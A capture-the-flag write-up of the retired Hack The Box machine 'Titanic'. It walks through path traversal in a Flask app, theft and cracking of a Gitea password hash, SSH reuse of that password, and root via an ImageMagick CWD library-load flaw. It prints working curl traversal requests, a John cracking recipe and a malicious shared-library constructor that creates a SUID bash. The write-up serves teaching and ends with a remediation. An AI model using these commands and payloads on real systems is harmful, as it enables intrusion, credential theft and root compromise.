# Titanic — Hack The Box, Easy, Linux

> Status: RETIRED (operator-confirmed) — publishable. Difficulty: Easy
> (operator-confirmed, not guessed). Flags are redacted in this copy.

**TL;DR:** An unauthenticated path traversal in a Flask booking app reads any
file as the `developer` user; that reads the co-located Gitea SQLite database,
whose `developer` hash cracks to a password reused for SSH; and a root cron that
runs `magick identify` inside a developer-writable directory (ImageMagick
CVE-2024-41817, CWD library load) turns that shell into root.

## Reconnaissance

Two ports, which immediately narrows the search to the web app:

    nmap -sCV 10.129.231.221
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
    80/tcp open  http    Apache 2.4.52 — redirect to http://titanic.htb/

Add `titanic.htb` to hosts. The site is a cruise-booking page served by
`Werkzeug/3.0.3 Python/3.10.12` (Flask behind Apache). The booking modal POSTs
to `/book`, which 302s to:

    Location: /download?ticket=<uuid>.json

A download endpoint whose only parameter is a *filename* is the first thing to
test for traversal.

## Foothold — arbitrary file read

    curl "http://titanic.htb/download?ticket=../../../../../../etc/passwd"

returns `/etc/passwd`. No sanitisation. `/etc/passwd` shows `developer` (uid
1000) and, tellingly, `_laurel` (auditd) — a privesc-theme hint for later. The
app runs as `developer`, so the read reaches `developer`'s home directly:

    curl ".../download?ticket=../../../../../../home/developer/user.txt"
    <redacted>

### Virtual hosts

Fuzzing `Host:` with `subdomains-top1million-20000` finds `dev.titanic.htb`:
Gitea 1.22.1. `/explore/repos` (unauthenticated) lists `developer/docker-config`
and `developer/flask-app`.

`docker-config` is the gift: the MySQL compose file leaks
`MYSQL_ROOT_PASSWORD` and an `sql_svc` account, and — more usefully — the Gitea
compose maps its data volume to `/home/developer/gitea/data`. `flask-app/app.py`
confirms the traversal is `os.path.join("tickets", ticket)` → `send_file`.

## Credential theft → SSH

Gitea stores users in SQLite. Pull it straight through the file-read bug:

    curl ".../download?ticket=../../../../../../home/developer/gitea/data/gitea/gitea.db" -o gitea.db
    sqlite3 gitea.db "SELECT name,passwd,salt,passwd_hash_algo FROM user;"

Both rows are `pbkdf2$50000$50` — PBKDF2-HMAC-SHA256, 50000 iterations, 50-byte
dk. John loads only a 32-byte digest, and PBKDF2 output blocks are sequential, so
the first 32 bytes of the 50-byte dk *are* a valid 32-byte dk — truncate the hex,
re-encode salt+digest in passlib's ab64, and crack:

    developer:$pbkdf2-sha256$50000$<salt>$<dk32>
    $ john --format=pbkdf2-hmac-sha256 --wordlist=rockyou.txt
    developer:25282528

(Always crack a self-chosen control hash first — a wrong encoding and "not in
rockyou" look identical otherwise.) The password is reused for SSH:

    ssh developer@titanic.htb   # 25282528
    developer@titanic:~$ cat user.txt
    <redacted>

The `administrator` hash did not fall to rockyou; it is not needed.

## Privilege escalation — ImageMagick CVE-2024-41817

What does root do on a timer? `/opt/scripts/identify_images.sh` (readable via the
LFI, later on the shell):

    cd /opt/app/static/assets/images
    find ... -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log

Two facts make this root:

    $ ls -la /opt/app/static/assets/images
    drwxrwx--- 2 root developer ...        # developer can write here
    $ ls -la metadata.log                  # mtime refreshes ~once a minute
    $ magick --version
    Version: ImageMagick 7.1.1-35          # CVE-2024-41817 (fixed in -36)

ImageMagick 7.1.1-35 resolves configuration and shared libraries from the
*current working directory*. Root's `magick identify` runs with its CWD set to a
directory `developer` can write. So a malicious `libxcb.so.1` dropped there is
loaded and its constructor runs as root.

Verify before weaponising — a benign constructor that writes `id`:

    __attribute__((constructor)) void init(void){ system("id > /tmp/mg_probe"); }
    gcc -shared -fPIC -o /opt/app/static/assets/images/libxcb.so.1 probe.c

One cycle later:

    $ cat /tmp/mg_probe
    uid=0(root) gid=0(root) groups=0(root)

Confirmed. Swap the payload for one that makes a SUID bash:

    system("cp /bin/bash /tmp/.rb; chown root:root /tmp/.rb; chmod 6755 /tmp/.rb");

and after the next cycle:

    $ /tmp/.rb -p -c 'id; cat /root/root.txt'
    uid=1000(developer) euid=0(root) ...
    <redacted>

## What I'd fix first

The traversal, not the ImageMagick bug. The CWD library-load is only reachable
after a shell; the arbitrary read is what produces that shell. Canonicalise the
`ticket` path and the entire chain dies at the first step.

## Leads that did not matter
- MySQL root/`sql_svc` creds from `docker-config`: the DB is container-local
  (127.0.0.1:3306) and not needed once the Gitea hash cracks.
- Gitea `administrator` hash: not in rockyou, and unnecessary.
- `_laurel`/auditd on the box: a theme/red herring, not part of the path.
